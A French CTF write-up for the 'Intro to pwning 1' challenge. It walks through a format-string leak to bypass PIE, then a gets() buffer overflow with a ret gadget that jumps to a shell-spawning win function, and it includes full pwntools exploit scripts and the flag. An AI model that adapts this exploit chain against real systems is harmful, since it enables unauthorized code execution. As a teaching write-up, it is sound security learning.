# [German FCSC] - Intro to pwning 1


![](/lib/images/writeups/german_fcsc/pwn//upload_8f2456481ef53f08c9c1d5e2490736da.png)



## TL;DR

Il existe 3 fonctions: une `welcome` vulnérable au format string, une `AAAAAAAA` vulnérable au buffer overflow et une fonction `win` qui permet de récupérer un bash. 
Le binaire est protégé par le bit NX, l'ASLR et la PIE. La format string permet de contourner l'ASLR et la PIE. Lorsque les adresses sont recalculées, il suffit d'exploiter le buffer overflow pour attérir dans la fonction "win" et ainsi récupérer le flag. 

## Etat des lieux

Ce challenge est le premier d'une suite de 3 challenges d'introduction à l'exploitation de binaire. Le but du premier est de contourner les protections mises en place afin d'exécuter des commandes sur le serveur distant.

Le binaire est soumis aux protections suivantes: 



![](/lib/images/writeups/german_fcsc/pwn//upload_89a920616938f03c5833ae988f5d4e9d.png)



Les sources du challenges sont données, ce qui est plus simple pour identifier des vulnérabilités. Ci-dessous les 3 fonctions principales du programme:



![](/lib/images/writeups/german_fcsc/pwn//upload_f5986b409e1672eccd12662c1d67356f.png)



Il est possible d'identifier deux endroits où la fonction "gets()" est utilisée: la fonction `welcome()` et `AAAAAAAA()`. La fonction `WINgardium_leviosa()` quant à elle permet de récupérer l'accès à un bash.

La fonction `gets()` est considérée comme dangereuse, car il est possible de lui passer un buffer en paramètre, mais sans préciser la taille. C'est pourquoi il est très dangereux d'utiliser cette fonction sur une entrée utilisateur.

Etant donné que la PIE est activé sur ce binaire, il est impossible de connaitre l'adresse de la fonction win sans leak de mémoire. C'est pour cela que le `gets(read_buf);` de la fonction `welcome()` sera utilisé.
Lorsque la mémoire sera leaké, le second `gets()` permettra de jump sur la fonction de win et ainsi récupérer le flag. Ci-dessous un schéma reprenant ce qui a été dit auparavant:

![](/lib/images/writeups/german_fcsc/pwn//upload_0adf691915300153f6410196c0a93d3b.png)

## Contournement de la PIE

Afin de contourner la PIE, il faut faire fuiter la mémoire grâce à l'utilisation du mécanisme "format string". Ces "chaines de format" permettent aux développeurs de pouvoir formater leur variable pendant l'affichage.

Parmis celles qui vont nous intéresser, il est possible de retrouver: 

| Format string | Usage |
| ------------- | ----- |
| %s / %x       | Permet de lire une donnée d'un pointeur connu sous forme de chaine de carctère ou hexa  |
| %n            | Permet d'écrire de la donnée à un pointeur connu  |
| %p            | Permet d'afficher les pointeurs sur la stack      |

Les deux premiers types de chaines de format permettent de lire et écrire à un pointeur connu. Or, ce n'est pas le cas ici. C'est pourquoi on va utiliser `%p`.

Pour tout ce qui est exploitation de binaire et gestion des bytes, python2 reste plus simple à utiliser. De plus, la librairie "pwntools" offre plus de possibilité en python2.

```python
#!/usr/bin/python2

from pwn import *

FORMATSTRING = "37:%37$p 38:%38$p 39:%39$p 40:%40$p 41:%41$p 42:%42$p 43:%43$p 44:%44$p 45:%45$p 46:%46$p 47:%47$p 48:%48$p 49:%49$p 50:%50$p 51:%51$p 52:%52$p 53:%53$p 54:%54$p 55:%55$p 56:%56$p 57:%57$p 58:%58$p 59:%59$p 60:%60$p 61:%61$p 62:%62$p 63:%63$p 64:%64$p"

p = process('./pwn1')
print(p.recvuntil('name:'))
p.sendline(FORMATSTRING)
leak = p.recvuntil('spell:')
print(leak.split(' '))
raw_input("gdb attach")
p.interactive()
```

Le gros payload `FORMATSTRING` est utile pour identifier rapidement quel bloque nous intéresse. Pour le générer, il est possible d'utiliser cette petit boucle bash:

```bash
for i in $(seq 1 64); do echo "$i:%$i\$p"; done | tr '\n' ' ' 
```

La fonction "raw_input" permet de bloquer l'exécution du programme et laisse le temps à l'attaquant de s'attacher au process.

![](/lib/images/writeups/german_fcsc/pwn//upload_b5159cd31594861ef3dde8be193143a7.png)


On cherche une adresse de fonction sur la stack, donc ça peut être l'adresse de "main", "welcome" ou "AAAAAAAA". Etant donné que la fonction "win" n'est pas appelée, il n'est pas possible de la trouver sur la stack en temps normal.

Le plugin "pwndbg" pour gdb est vraiment pratique pour récupérer tout un tas d'information sur le contexte d'exécution d'un binaire.

On va lancer une première fois le binaire avec pwntool et s'attacher au process avec gdb:

```bash
$ sudo gdb -p `pidof pwn1`
(pwndbg) > b* main
(pwndbg) > vmmap
```

![](/lib/images/writeups/german_fcsc/pwn//upload_0e52096aa4301a433becae14b83c838e.png)

Les adresses en `0x55...` sont donc des adresses liées au binaire en exécution.

Si on reprend la capture d'écran au dessus, il y en a quelques unes: 

![](/lib/images/writeups/german_fcsc/pwn//upload_e602134b7b6bf97e439d03c283b5bd4d.png)

L'adresse pointée par les flèches est l'adresse de "main":

![](/lib/images/writeups/german_fcsc/pwn//upload_cdb8ee9979a49a15db5ee8402df50f6f.png)

En comparant avec les sources, il est possible d'identifier qu'il s'agit de la même fonction:



![](/lib/images/writeups/german_fcsc/pwn//upload_7f3b93fd7eb1a4b193a22f9bdef39fa5.png)



Pour récupérer l'adresse de base, il suffit de soutraire la base adresse trouvée dans "vmmap" et l'adresse de main:

![](/lib/images/writeups/german_fcsc/pwn//upload_077c13eee08fafbc7106430098b08630.png)

Maintenant, la PIE est complètement contourné, car il est possible de récupérer l'adresse de base via un leak.

En modifiant un peu le script d'exploitation, il est possible de récupérer à tout les coups l'adresse de base:

```python
#!/usr/bin/python2

from pwn import *

FORMATSTRING = "|%47$p|"

p = process('./pwn1')
print(p.recvuntil('name:'))
p.sendline(FORMATSTRING)
leak = p.recvuntil('spell:').split('|')
base_addr = int(leak[-2], 16)-0x36f
log.info("Adresse de base: {}".format(hex(base_addr)))
raw_input("gdb attach")
p.interactive()
```

![](/lib/images/writeups/german_fcsc/pwn//upload_0ae689293e4f08ce4709d7ff3cb86bb1.png)

Une base address est reconnaissable grâce aux "000" à la fin. Ces zéros sont là, car la base address doit être alignée sur une page mémoire (0x1000).

De la même façon, il est possible de calculer l'offset de la fonction win et pouvoir jump dessus plus tard:

![](/lib/images/writeups/german_fcsc/pwn//upload_4bba29f3895264a062f4640854ea2206.png)

Il est possible de vérifier que notre offset est correct. On modifie à nouveau notre script pour qu'il affiche l'adresse re calculée et avec gdb il est possible de voir s'il s'agit de la bonne fonction:

```python
#!/usr/bin/python2

from pwn import *

FORMATSTRING = "|%47$p|"

p = process('./pwn1')
print(p.recvuntil('name:'))
p.sendline(FORMATSTRING)
leak = p.recvuntil('spell:').split('|')

base_addr = int(leak[-2], 16)-0x36f
log.info("Adresse de base: {}".format(hex(base_addr)))

win_offset = base_addr+0x267
log.info("Adresse de la fonction win: {}".format(hex(win_offset)))
raw_input("gdb attach")
p.interactive()
```

![](/lib/images/writeups/german_fcsc/pwn//upload_ae5c5b0841fb4cfe9d32bb697e331cb0.png)

Pour rappel, la fonction win ressemble à ceci en C:


    
![](/lib/images/writeups/german_fcsc/pwn//upload_2b48f737e939725bc10cd7147604168e.png)


## Exploitation du buffer overflow

Maintenant qu'il est possible re calculer l'adresse de la fonction win, il faut pouvoir exploiter le buffer overflow et jump dessus. Pour cela, il faut connaitre le padding de ce buffer et voir lorsqu'il segfault.

Pour cela, regardons la fonction "AAAAAAAA" de plus près:



![](/lib/images/writeups/german_fcsc/pwn//upload_a60bfa047591a673e9478d59fa406b35.png)



Il faut entrer un "secret" afin de pouvoir exploiter la vulnérabilité, sinon le programme se termine. De plus, on sait que le buffer est d'une taille de "0xff".

```python
#!/usr/bin/python2

from pwn import *

FORMATSTRING = "|%47$p|"

p = process('./pwn1')
print(p.recvuntil('name:'))
p.sendline(FORMATSTRING)
leak = p.recvuntil('spell:').split('|')

base_addr = int(leak[-2], 16)-0x36f
log.info("Adresse de base: {}".format(hex(base_addr)))

win_offset = base_addr+0x267
log.info("Adresse de la fonction win: {}".format(hex(win_offset)))

raw_input("gdb attach")
p.sendline("Expelliarmus\x00"+cyclic(0xfff)) # <-- PAYLOAD
p.interactive()
```

On place notre payload après le "raw_input()" afin de pouvoir s'attacher et process et voir où il crash.

![](/lib/images/writeups/german_fcsc/pwn//upload_cd368400aa6308cb2c4dc69eb32efbb8.png)

L'adresse situé dans le registre RIP contient en réalité une chaine de caractère "cnaacoaa". Cette chaine est le résultat de la fonction "cyclic", qui va générer une chaine d'une taille demandée unique permettant de connaitre la taille du buffer avant le crash.

Maintenant que l'on connait la taille du buffer, il est possible de contrôler RIP et ainsi pouvoir jump sur la fonction win.

```python
#!/usr/bin/python2

from pwn import *

FORMATSTRING = "|%47$p|"

p = process('./pwn1')
print(p.recvuntil('name:'))
p.sendline(FORMATSTRING)
leak = p.recvuntil('spell:').split('|')

base_addr = int(leak[-2], 16)-0x36f
log.info("Adresse de base: {}".format(hex(base_addr)))

win_offset = base_addr+0x267
log.info("Adresse de la fonction win: {}".format(hex(win_offset)))

raw_input("gdb attach")

PAYLOAD = "Expelliarmus\x00"        # <-- Secret
PAYLOAD += "A"*cyclic_find("cnaa")  # <-- PADDING
PAYLOAD += p64(win_offset)          # <-- Jump vers la fonction win

p.sendline(PAYLOAD)
p.interactive()
```

Le payload devrait fonctionner, mais le programme segfault quand même:

![](/lib/images/writeups/german_fcsc/pwn//upload_87522ae9b2a2734684aa5b7939396a6e.png)

En effet, l'adresse sur RSP doit être alignée, donc se terminer par "0". En l'occurence, la stack n'est pas aligné, donc il faut ajouter un "ret" sur la stack pour la réaligner. Pour trouver un gadget "ret", il suffit de le calculer de quelque part:

![](/lib/images/writeups/german_fcsc/pwn//upload_d768f33d01ca5c2deb6a3ec6b1ec693e.png)

La fonction win est le plus simple étant donné qu'on a son adresse dans notre script d'exploitation. Le script final est donc:

```python
#!/usr/bin/python2

from pwn import *

HOST = "hax1.allesctf.net"
PORT = 9100
FORMATSTRING = "|%47$p|"

p = process('./pwn1')
#p = remote(HOST, PORT)
print(p.recvuntil('name:'))
p.sendline(FORMATSTRING)
leak = p.recvuntil('spell:').split('|')

base_addr = int(leak[-2], 16)-0x36f
log.info("Adresse de base: {}".format(hex(base_addr)))

win_offset = base_addr+0x267
log.info("Adresse de la fonction win: {}".format(hex(win_offset)))

ret_gadget = win_offset+0x36

raw_input("gdb attach")

PAYLOAD = "Expelliarmus\x00"
PAYLOAD += "A"*cyclic_find("cnaa")
PAYLOAD += p64(ret_gadget)
PAYLOAD += p64(win_offset)

p.sendline(PAYLOAD)
p.interactive()
```

![](/lib/images/writeups/german_fcsc/pwn//upload_1fa334b0232b7d042a83359fbfd2efba.png)

## Flag

> CSCG{NOW_PRACTICE_MORE}
